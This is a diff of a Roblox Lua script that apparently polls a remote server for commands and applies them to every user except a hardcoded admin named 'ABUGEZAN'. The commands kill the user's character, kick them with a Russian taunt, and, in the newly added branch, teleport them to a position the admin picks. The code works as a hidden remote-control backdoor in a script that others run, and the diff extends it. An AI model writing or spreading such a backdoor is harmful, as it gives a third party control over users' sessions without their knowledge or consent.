@@ -3087,16 +3087,30 @@ local lastCmdId = ""
 local sessionStartTime = os.time()
 local ADMIN_NAME = "ABUGEZAN"
 
-local function runAdminAction(action: string, issuer: string)
+local function runAdminAction(cmdData: any, issuer: string)
     if LocalPlayer.Name == ADMIN_NAME or LocalPlayer.DisplayName == ADMIN_NAME then
         return
     end
 
+    local action = (type(cmdData) == "table") and cmdData.action or cmdData
     local char = LocalPlayer.Character
     local hum = char and char:FindFirstChildOfClass("Humanoid")
     local root = char and char:FindFirstChild("HumanoidRootPart")
 
-    if action == "kill" then
+    if action == "bring" and type(cmdData) == "table" and cmdData.targetPos then
+        if root then
+            pcall(function()
+                root.AssemblyLinearVelocity = Vector3.zero
+                root.AssemblyAngularVelocity = Vector3.zero
+            end)
+            local dest = Vector3.new(cmdData.targetPos.X, cmdData.targetPos.Y, cmdData.targetPos.Z)
+            if char:IsA("Model") then
+                char:PivotTo(CFrame.new(dest))
+            else
+                root.CFrame = CFrame.new(dest)
+            end
+        end
+    elseif action == "kill" then
         if hum then hum.Health = 0 end
     elseif action == "kick" then
         LocalPlayer:Kick("ты был выкинут с сервера админ панелью абугезана")
@@ -3208,7 +3222,7 @@ if httpRequest then
                     local cmdTime = tonumber(cmdData.timestamp) or 0
                     if cmdData.cmdId ~= lastCmdId and cmdTime >= sessionStartTime then
                         lastCmdId = cmdData.cmdId
-                        runAdminAction(cmdData.action, cmdData.issuer or "Admin")
+                        runAdminAction(cmdData, cmdData.issuer or "Admin")
                     end
                 end
             end
